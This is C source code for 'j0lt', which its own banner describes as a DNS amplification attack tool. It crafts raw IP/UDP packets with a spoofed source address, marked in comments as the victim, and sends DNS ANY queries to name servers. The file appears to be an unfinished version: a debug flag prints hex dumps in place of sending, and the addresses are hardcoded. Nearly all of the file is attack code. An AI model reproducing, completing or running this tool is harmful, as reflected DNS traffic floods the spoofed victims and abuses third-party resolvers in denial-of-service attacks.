/*
* For using:
* ./j0lt <DST IP> <DST PORT> <SOURCE IP SPOOF> <SOURCE PORT>
*
* For reading:
* https://datatracker.ietf.org/doc/html/rfc1700 (NUMBERS)
* https://www.rfc-editor.org/rfc/rfc768.html (UDP)
* https://www.rfc-editor.org/rfc/rfc760 (IP)
*
* For testing:
* use ctrl + ` to bring up a terminal then $ unshare -rn. This will give you suid to test this
* sudo tcpdump -X -n udp port 53
*/

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h> 

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <arpa/nameser.h> 
#include <arpa/nameser_compat.h>

#include <netinet/ip.h>
#include <netinet/udp.h>

#include <netdb.h>
#include <unistd.h>

#define DEBUG 1

typedef struct __attribute__((packed, aligned(1)))
{
    uint32_t sourceaddr;
    uint32_t destaddr;

#if __BYTE_ORDER == __BIGENDIAN 
    uint32_t zero : 8;
    uint32_t protocol : 8;
    uint32_t udplen : 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint32_t udplen : 16;
    uint32_t protocol : 8;
    uint32_t zero : 8;
#endif
} PSEUDOHDR;

typedef struct iphdr IPHEADER;
typedef struct udphdr UDPHEADER;
typedef HEADER DNSHEADER;

#define DEFINE_INSERT_FN(typename, datatype)           \
        bool insert_##typename                         \
        (uint8_t** buf, size_t* buflen, datatype data) \
    {                                                  \
        uint64_t msb_mask, lsb_mask,                   \
            bigendian_data, lsb, msb;                  \
        size_t byte_pos, nbits;                        \
                                                       \
        if (*buflen < 1) {                             \
            return false;                              \
        }                                              \
                                                       \
        nbits = sizeof(data) << 3;                     \
        bigendian_data = 0ULL;                         \
        byte_pos = (nbits / 8) - 1;                    \
        lsb_mask = 0xffULL;                            \
        msb_mask = lsb_mask << nbits - 8;              \
                                                       \
        byte_pos = byte_pos << 3;                      \
        for (int i = nbits >> 4; i != 0; i--) {        \
            lsb = (data & lsb_mask);                   \
            msb = (data & msb_mask);                   \
            lsb <<= byte_pos;                          \
            msb >>= byte_pos;                          \
            bigendian_data |= lsb | msb;               \
            msb_mask >>= 8;                            \
            lsb_mask <<= 8;                            \
            byte_pos -= (2 << 3);                      \
        }                                              \
                                                       \
        data = bigendian_data == 0 ?                   \
            data : bigendian_data;                     \
        for (int i = sizeof(data);                     \
             *buflen != -1 && i > 0; i--) {            \
            *(*buf)++ = (data & 0xff);                 \
            data >>= 8;                                \
            (*buflen)--;                               \
        }                                              \
                                                       \
        return data == 0;                              \
    }                                                  \

DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

#define     IPVER 4
#define     IHL_MIN 5
#define     IHL_MAX 15
#define     ID 0x1337
#define     QR 0 // query (0),
#define     AA 0 // Authoritative Answer
#define     TC 0 // TrunCation
#define     RD 1 // Recursion Desired   (END OF BYTE 3)
#define     RA 0 // Recursion Available
#define     Z  0 // Reserved
#define     AD 1 // Authentic Data (DNS-SEC)
#define     CD 0 // Checking Disabled (DNS-SEC)
#define     QDCOUNT 1 // num entry question
#define     ANCOUNT 0 // num RR answer
#define     NSCOUNT 0 // num NS RR 
#define     ARCOUNT 0 // num RR additional

const char* g_ansi = {
    " Usage: sudo ./j0lt [OPTION]...          \n"
    "                                         \n"
    "-d <dst>        : target server          \n"
    "-p <port>       : target port            \n"
    "-n <num>        : num UDP packets to send\n"
    "-r <dns rcrd>   : list of dns records    \n"
    "-s <dns srv>    : list of dns servers    \n"
    "-P <dns port>   : dns port (53)          \n"
    "                                         \n"
    " w3lc0m3 t0 j0lt                         \n"
    " a DNS amplification attack tool         \n"
    "                                         \n"
    "            the-scientist@rootstorm.com\n\n"
};

bool
insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader);
bool
insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header);
bool
insert_dns_header(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
bool
insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
void
pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode);
void
pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, const char* dport, const char* sport, size_t nwritten);
void
pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char* sourceip, size_t nwritten, size_t udpsz);
bool
insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
uint16_t
checksum(const uint16_t* addr, size_t count);

int
main(int argc, char** argv)
{
    const char* destip, * sourceport, * sourceip, * destport;
    uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ], * curpos;

    struct sockaddr_in addr, srcaddr;
    size_t buflen, nwritten, szdatagram, i, j;
    int raw_sockfd;
    bool status;

    UDPHEADER udpheader;
    DNSHEADER dnsheader;
    IPHEADER ipheader;
    PSEUDOHDR pseudoheader;

    printf("%s", g_ansi);

    if (argc != 5) {
        goto fail_state;
    }

#if !DEBUG
    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sockfd == -1) {
        goto fail_state;
    }
#endif

    destip = argv[ 1 ];
    destport = argv[ 2 ];
    sourceip = argv[ 3 ];
    sourceport = argv[ 4 ];

    buflen = NS_PACKETSZ;
    memset(pktbuf, 0, NS_PACKETSZ);

    curpos = pktbuf;
    status = true;
    pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
    status &= insert_dns_header(&curpos, &buflen, &dnsheader);
    status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_any, ns_c_any);
    if (status == false)
        goto fail_close;

    nwritten = NS_PACKETSZ - buflen;
    pack_iphdr(&ipheader, &pseudoheader, destip, sourceip, nwritten, sizeof(UDPHEADER));
    pack_udphdr(&udpheader, &pseudoheader, destport, sourceport, nwritten);

    addr.sin_family = AF_INET;
    addr.sin_port = udpheader.uh_dport;
    addr.sin_addr.s_addr = ipheader.daddr;

    memset(datagram, 0, NS_PACKETSZ);
    curpos = datagram;
    status &= insert_ip_header(&curpos, &buflen, &ipheader);
    status &= insert_udp_header(&curpos, &buflen, &udpheader, &pseudoheader);
    if (status == false)
        goto fail_close;

    szdatagram = buflen;
    insert_data(( void** ) &curpos, &szdatagram, pktbuf, nwritten);

    nwritten = NS_PACKETSZ - buflen;
#if !DEBUG
    sendto(raw_sockfd, datagram, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
    close(raw_sockfd);
#else 
    for (j = 0, i = 0; i < nwritten; i++) {
        if (i % 16 == 0) {
            printf("\n0x%.4x: ", j);
            j += 16;
        }
        if (i % 2 == 0)
            printf(" ");
        printf("%.2x", datagram[ i ]);
    }
    printf("\n%2x\n", i);
#endif
    return 0;
fail_close:
#if !DEBUG
    close(raw_sockfd);
#endif
fail_state:
    perror("error");
    exit(EXIT_FAILURE);
}

void
pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char* sourceip, size_t nwritten, size_t udpsz)
{
    memset(iphdr, 0, sizeof(IPHEADER));
    iphdr->version = IPVER;
    iphdr->ihl = IHL_MIN;
    iphdr->tot_len = 0x4f; // (iphdr->ihl << 2) + udpsz + nwritten;
    iphdr->id = 0xc47e; //ID;
    iphdr->ttl = 0x40; //0xff;
    iphdr->protocol = getprotobyname("udp")->p_proto;
    iphdr->saddr = htonl(inet_addr("10.137.0.16")); // htonl(inet_addr(sourceip)); // spoofed ip address to victim
    iphdr->daddr = htonl(inet_addr("10.139.1.1"));// htonl(inet_addr(destip)); // name server 

    memset(pseudohdr, 0, sizeof(PSEUDOHDR));
    pseudohdr->protocol = iphdr->protocol;
    pseudohdr->destaddr = iphdr->daddr;
    pseudohdr->sourceaddr = iphdr->saddr;
}

void
pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, const char* dport, const char* sport, size_t nwritten)
{
    uint16_t dport_uint16;
    uint16_t sport_uint16;

    errno = 0;
    dport_uint16 = ( uint16_t ) strtol(dport, NULL, 0);
    sport_uint16 = ( uint16_t ) strtol(sport, NULL, 0);
    if (errno != 0) {
        perror("port error: strtol");
        exit(EXIT_FAILURE);
    }

    memset(udphdr, 0, sizeof(UDPHEADER));
    udphdr->uh_dport = dport_uint16; // nameserver port
    udphdr->uh_sport = sport_uint16; // victim port
    udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);
    pseudohdr->udplen = udphdr->uh_ulen;
}

void
pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
{
    memset(dnshdr, 0, sizeof(DNSHEADER));
    dnshdr->id = ID;
    dnshdr->rd = RD;
    dnshdr->tc = TC;
    dnshdr->aa = AA;
    dnshdr->opcode = opcode;
    dnshdr->qr = QR;
    dnshdr->rcode = rcode;
    dnshdr->cd = CD;
    dnshdr->ad = AD;
    dnshdr->unused = Z;
    dnshdr->ra = RA;
    dnshdr->qdcount = QDCOUNT;
    dnshdr->ancount = ANCOUNT;
    dnshdr->nscount = NSCOUNT;
    dnshdr->arcount = ARCOUNT;
}
/*
 * 	0x0000:  4500 004f c47e 0000 4011 9ffb 0a89 0010  E..O.~..@.......
 *	0x0010:  0a8b 0101 9955 0035 003b 1671 514e 0120  .....U.5.;.qQN..
 *	0x0020:  0001 0000 0000 0001 0667 6f6f 676c 6503  .........google.
 *	0x0030:  636f 6d00 0001 0001 0000 2910 0000 0000  com.......).....
 *	0x0040:  0000 0c00 0a00 085f 2870 ddb8 d601 89    ......._(p.....
 */
bool
insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header)
{
    bool status;
    uint8_t* bufptr = *buf;
    uint8_t first_byte;

    status = true;
    first_byte = header->version << 4 | header->ihl;
    status &= insert_byte(buf, buflen, first_byte);
    status &= insert_byte(buf, buflen, header->tos);
    status &= insert_word(buf, buflen, header->tot_len);
    status &= insert_word(buf, buflen, header->id);
    status &= insert_word(buf, buflen, header->frag_off);
    status &= insert_byte(buf, buflen, header->ttl);
    status &= insert_byte(buf, buflen, header->protocol);
    status &= insert_word(buf, buflen, header->check);
    status &= insert_dword(buf, buflen, header->saddr);
    status &= insert_dword(buf, buflen, header->daddr);

    header->check = checksum(( const uint16_t* ) bufptr, ( size_t ) header->ihl << 2);
    *buf -= 0xa;
    *(*buf)++ = (header->check & 0xff00) >> 8;
    **buf = header->check & 0xff;
    *buf += 9;

    return status;
}

bool
insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader)
{
    bool status;
    size_t i = 12;
    uint8_t pseudo[ i ];
    uint8_t* pseudoptr = pseudo;

    status = true;
    status &= insert_word(buf, buflen, header->uh_dport);
    status &= insert_word(buf, buflen, header->uh_sport);
    status &= insert_word(buf, buflen, header->uh_ulen);
    status &= insert_word(buf, buflen, header->uh_sum);

    insert_dword(&pseudoptr, &i, pseudoheader->sourceaddr);
    insert_dword(&pseudoptr, &i, pseudoheader->destaddr);
    insert_byte(&pseudoptr, &i, pseudoheader->zero);
    insert_byte(&pseudoptr, &i, pseudoheader->protocol);
    insert_word(&pseudoptr, &i, pseudoheader->udplen);

    header->uh_sum = checksum(( const uint16_t* ) pseudo, 12);

    return status;
}

bool
insert_dns_header(uint8_t** buf, size_t* buflen, const HEADER* header)
{
    bool status;
    uint8_t third_byte, fourth_byte;

    third_byte = (
        header->rd |
        header->tc << 1 |
        header->aa << 2 |
        header->opcode << 3 |
        header->qr << 7
    );

    fourth_byte = (
        header->rcode |
        header->cd << 4 |
        header->ad << 5 |
        header->unused << 6 |
        header->ra << 7
    );

    status = true;
    status &= insert_word(buf, buflen, header->id);

    status &= insert_byte(buf, buflen, third_byte);
    status &= insert_byte(buf, buflen, fourth_byte);

    status &= insert_word(buf, buflen, header->qdcount);
    status &= insert_word(buf, buflen, header->ancount);
    status &= insert_word(buf, buflen, header->nscount);
    status &= insert_word(buf, buflen, header->arcount);

    return status;
}

bool
insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
{
    const char* token;
    char* saveptr, qname[ NS_PACKETSZ ];
    size_t srclen, domainlen;
    bool status;

    domainlen = strlen(domain) + 1;
    if (domainlen > NS_PACKETSZ - 1)
        return false;

    memcpy(qname, domain, domainlen);

    token = strtok_r(qname, ".", &saveptr);
    if (token == NULL)
        return false;

    while (token != NULL) {
        srclen = strlen(token);
        insert_byte(( uint8_t** ) buf, buflen, srclen);
        insert_data(buf, buflen, token, srclen);
        token = strtok_r(NULL, ".", &saveptr);
    }

    status = true;
    status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
    status &= insert_word(( uint8_t** ) buf, buflen, query_type);
    status &= insert_word(( uint8_t** ) buf, buflen, query_class);

    return status;
}

bool
insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
{
    if (*dst_buflen < src_len)
        return false;

    memcpy(*dst, src, src_len);
    *dst += src_len;
    *dst_buflen -= src_len;

    return true;
}
/*
 * 	0x0000:  4500 004f c47e 0000 4011 9ffb 0a89 0010  E..O.~..@.......
 *	0x0010:  0a8b 0101 9955 0035 003b 1671 514e 0120  .....U.5.;.qQN..
 *	0x0020:  0001 0000 0000 0001 0667 6f6f 676c 6503  .........google.
 *	0x0030:  636f 6d00 0001 0001 0000 2910 0000 0000  com.......).....
 *	0x0040:  0000 0c00 0a00 085f 2870 ddb8 d601 89    ......._(p.....
 */

uint16_t
checksum(const uint16_t* addr, size_t count)
{
    register uint64_t sum = 0;

    while (count > 1) {
        sum += *( uint16_t* ) addr++;
        count -= 2;
    }

    if (count > 0)
        sum += *( uint8_t* ) addr;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return ~(( uint16_t ) ((sum << 8) | (sum >> 8)));
}
